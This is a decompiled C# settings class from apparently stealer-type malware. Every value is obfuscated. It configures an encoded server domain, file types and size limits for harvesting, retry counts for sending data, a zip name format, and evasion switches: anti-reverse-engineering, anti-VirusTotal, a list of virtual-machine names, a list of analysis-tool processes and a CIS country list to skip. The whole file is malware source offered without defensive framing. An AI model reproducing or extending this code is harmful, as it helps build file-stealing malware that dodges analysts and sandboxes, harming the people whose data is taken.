using System;
using System.Runtime.CompilerServices;

namespace Application
{
	// Token: 0x02000005 RID: 5
	internal class Settings
	{
		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000019 RID: 25 RVA: 0x0000232C File Offset: 0x0000052C
		// (set) Token: 0x0600001A RID: 26 RVA: 0x00002340 File Offset: 0x00000540
		public static string Id { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x0600001B RID: 27 RVA: 0x00002354 File Offset: 0x00000554
		// (set) Token: 0x0600001C RID: 28 RVA: 0x00002368 File Offset: 0x00000568
		public static string Domen { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x0600001D RID: 29 RVA: 0x0000237C File Offset: 0x0000057C
		// (set) Token: 0x0600001E RID: 30 RVA: 0x00002390 File Offset: 0x00000590
		public static string InformationDescription { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x0600001F RID: 31 RVA: 0x000023A4 File Offset: 0x000005A4
		// (set) Token: 0x06000020 RID: 32 RVA: 0x000023B8 File Offset: 0x000005B8
		public static bool AntiCis { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x06000021 RID: 33 RVA: 0x000023CC File Offset: 0x000005CC
		// (set) Token: 0x06000022 RID: 34 RVA: 0x000023E0 File Offset: 0x000005E0
		public static bool AntiReverse { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x06000023 RID: 35 RVA: 0x000023F4 File Offset: 0x000005F4
		// (set) Token: 0x06000024 RID: 36 RVA: 0x00002408 File Offset: 0x00000608
		public static bool AntiVT { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06000025 RID: 37 RVA: 0x0000241C File Offset: 0x0000061C
		// (set) Token: 0x06000026 RID: 38 RVA: 0x00002430 File Offset: 0x00000630
		public static string[] FileTypes { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x06000027 RID: 39 RVA: 0x00002444 File Offset: 0x00000644
		// (set) Token: 0x06000028 RID: 40 RVA: 0x00002458 File Offset: 0x00000658
		public static int MaxFileSize { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000029 RID: 41 RVA: 0x0000246C File Offset: 0x0000066C
		// (set) Token: 0x0600002A RID: 42 RVA: 0x00002480 File Offset: 0x00000680
		public static int MaxCountFiles { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x0600002B RID: 43 RVA: 0x00002494 File Offset: 0x00000694
		// (set) Token: 0x0600002C RID: 44 RVA: 0x000024A8 File Offset: 0x000006A8
		public static int AttemptsSend { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x0600002D RID: 45 RVA: 0x000024BC File Offset: 0x000006BC
		// (set) Token: 0x0600002E RID: 46 RVA: 0x000024D0 File Offset: 0x000006D0
		public static int AttempsSendTimeout { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x0600002F RID: 47 RVA: 0x000024E4 File Offset: 0x000006E4
		// (set) Token: 0x06000030 RID: 48 RVA: 0x000024F8 File Offset: 0x000006F8
		public static string InformationFormat { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000031 RID: 49 RVA: 0x0000250C File Offset: 0x0000070C
		// (set) Token: 0x06000032 RID: 50 RVA: 0x00002520 File Offset: 0x00000720
		public static string ZipNameFormat { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000033 RID: 51 RVA: 0x00002534 File Offset: 0x00000734
		// (set) Token: 0x06000034 RID: 52 RVA: 0x00002548 File Offset: 0x00000748
		public static string[] AntiRepeatDirectories { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000035 RID: 53 RVA: 0x0000255C File Offset: 0x0000075C
		// (set) Token: 0x06000036 RID: 54 RVA: 0x00002570 File Offset: 0x00000770
		public static string[] VmNames { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x06000037 RID: 55 RVA: 0x00002584 File Offset: 0x00000784
		// (set) Token: 0x06000038 RID: 56 RVA: 0x00002598 File Offset: 0x00000798
		public static string[] BadProcesses { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x06000039 RID: 57 RVA: 0x000025AC File Offset: 0x000007AC
		// (set) Token: 0x0600003A RID: 58 RVA: 0x000025C0 File Offset: 0x000007C0
		public static string[] CisCountries { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x0600003B RID: 59 RVA: 0x000025D4 File Offset: 0x000007D4
		[MethodImpl(MethodImplOptions.NoInlining)]
		public Settings()
		{
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000025DC File Offset: 0x000007DC
		// Note: this type is marked as 'beforefieldinit'.
		static Settings()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
			Settings.Id = c0000c0.m00000f("\u00a02tS\u0090^\u0005\u000f\u0099C");
			Settings.Domen = c0000c0.m00000f("ùu9\u0014\u009cF\u001cV\u009cG|\u0018;¦}Iîñ\u001e\u000e\u0003¶o\u0082");
			Settings.InformationDescription = c0000c0.m00000f("¬");
			Settings.AntiCis = true;
			Settings.AntiReverse = true;
			Settings.AntiVT = false;
			Settings.FileTypes = new string[]
			{
				c0000c0.m00000f("åy9")
			};
			Settings.MaxFileSize = 3145728;
			Settings.MaxCountFiles = 10;
			Settings.AttemptsSend = 10;
			Settings.AttempsSendTimeout = 1000;
			Settings.InformationFormat = c0000c0.m00000f("✣!m&Ê\u0006\\SÕxD➈(·\u0004\u0017¬¢\u0015VPÎ➾\u008dsý\u0018«yÌ\u0091Ï'\u00171]å\u0087➄Ð\u001e8»ðéWÃX\u0091Â9¬òH\u001cÆ\ud8d8\udd430Ç\u00a02S\u0081ùù|´?ÚísQ\u0001\"\ud883\udf91£1Yt.\u0082tú\u007fÎÇZIøò\ud840\udde5 É\n»uhYêÈo\u001eì\v\ud870\udcd7\u0086IpVÞ\u0016=\u0016(ì{\u001a\u009c\ud8bf\udcb4F\r\u0082sÁ6ÍMþl\u008f\u009e¼\u0017➓j.ýùH\u0095M\t©¯»B\u009aHþ❜9\u0092°\\u\u008b\u0084óu\u0094Ês[Ëó\u009c➪ð\v¯\u008a2B\a\u0019\u008f\u0086\u0089➵:T3\u0080zöbÎÇZL´\u0085w➓ º8±fh\u0010ð\u0093%\u0019ì\v⟩Dò\f_RË\0/A2·6V¥ÿd⟂\r±NÂ!Ì\u0012°c\u0082ÃÍ,\u00037f✼­v\u0099S\b\u009fúéUÆ\u000fÔ\u0083(â½?\u001c❨ÅÙq\u008a\u0095i\0\u0089¿\u00a0sÚ⟨À\u009fa\u0001\u0014\u0012\u009f\u0080²&g\u0011K❍=Ûi\u0087\u0084S\u0014õ\u008c\u0014XnÓl¯6=W");
			Settings.ZipNameFormat = c0000c0.m00000f("Êz}\u0019ûIH\u0006Ñ\\4Ex");
			Settings.AntiRepeatDirectories = new string[]
			{
				c0000c0.m00000f("Çh)\u0001É\u001aoaÉ\u0015/_^þ)\u0002ùñ")
			};
			Settings.VmNames = new string[]
			{
				c0000c0.m00000f("çh?\u0010Ó\b_"),
				c0000c0.m00000f("çl/\vÞ"),
				c0000c0.m00000f("çl:\u0005Ô\f"),
				c0000c0.m00000f("çh?\u0010Ó\b_UÃ\n"),
				c0000c0.m00000f("ón5"),
				c0000c0.m00000f("åi$\nÇ\u0019C"),
				c0000c0.m00000f("çl5\f"),
				c0000c0.m00000f("øo#\vÒ\fX\u0017Ë\u001f,D"),
				c0000c0.m00000f("åq;\aÁ\bGRÛ\u00137"),
				c0000c0.m00000f("åq,\u0011Ò\u0006PXÂ\u001c=Zk"),
				c0000c0.m00000f("çc\"\u001c"),
				c0000c0.m00000f("úw "),
				c0000c0.m00000f("ãd)DÎ\bG")
			};
			Settings.BadProcesses = new string[]
			{
				c0000c0.m00000f("ùu9\u0014Ç\aR[Õ\b+^"),
				c0000c0.m00000f("÷h)\0Ê\fA"),
				c0000c0.m00000f("÷h?\u0001Õ\u0001VRÜ"),
				c0000c0.m00000f("âo$\u0002À\fA"),
				c0000c0.m00000f("õo>\u0014ß"),
				c0000c0.m00000f("õd/\u0011Á\u000eVE"),
				c0000c0.m00000f("ød:\u0005Ò\n["),
				c0000c0.m00000f("õt \u0014Å\bC"),
				c0000c0.m00000f("æh?\u0001Õ\u0001REÇ"),
				c0000c0.m00000f("âx>\rÈ\u001dVEÂ\u0013\"_|ô=\u0011ÿç\u0019"),
				c0000c0.m00000f("ÿd9\u0013É\u001bXZÅ\u001c+^"),
				c0000c0.m00000f("ÿd9\u0013É\u001bXCÞ\u0013(Jaô;\u000eóõ"),
				c0000c0.m00000f("åb=\0Ó\u0004C"),
				c0000c0.m00000f("øo9\u0001Ô\nVGØ\u0017<")
			};
			Settings.CisCountries = new string[]
			{
				c0000c0.m00000f("ÐL"),
				c0000c0.m00000f("Ð["),
				c0000c0.m00000f("ÓX"),
				c0000c0.m00000f("Ú["),
				c0000c0.m00000f("ÚF"),
				c0000c0.m00000f("ÃT"),
				c0000c0.m00000f("ÅK"),
				c0000c0.m00000f("ÅL"),
				c0000c0.m00000f("Ä@"),
				c0000c0.m00000f("Ä[")
			};
		}

		// Token: 0x04000007 RID: 7
		[CompilerGenerated]
		private static string f000007;

		// Token: 0x04000008 RID: 8
		[CompilerGenerated]
		private static string f000008;

		// Token: 0x04000009 RID: 9
		[CompilerGenerated]
		private static string f000009;

		// Token: 0x0400000A RID: 10
		[CompilerGenerated]
		private static bool f00000a;

		// Token: 0x0400000B RID: 11
		[CompilerGenerated]
		private static bool f00000b;

		// Token: 0x0400000C RID: 12
		[CompilerGenerated]
		private static bool f00000c;

		// Token: 0x0400000D RID: 13
		[CompilerGenerated]
		private static string[] f00000d;

		// Token: 0x0400000E RID: 14
		[CompilerGenerated]
		private static int f00000e;

		// Token: 0x0400000F RID: 15
		[CompilerGenerated]
		private static int f00000f;

		// Token: 0x04000010 RID: 16
		[CompilerGenerated]
		private static int f000010;

		// Token: 0x04000011 RID: 17
		[CompilerGenerated]
		private static int f000011;

		// Token: 0x04000012 RID: 18
		[CompilerGenerated]
		private static string f000012;

		// Token: 0x04000013 RID: 19
		[CompilerGenerated]
		private static string f000013;

		// Token: 0x04000014 RID: 20
		[CompilerGenerated]
		private static string[] f000014;

		// Token: 0x04000015 RID: 21
		[CompilerGenerated]
		private static string[] f000015;

		// Token: 0x04000016 RID: 22
		[CompilerGenerated]
		private static string[] f000016;

		// Token: 0x04000017 RID: 23
		[CompilerGenerated]
		private static string[] f000017;
	}
}
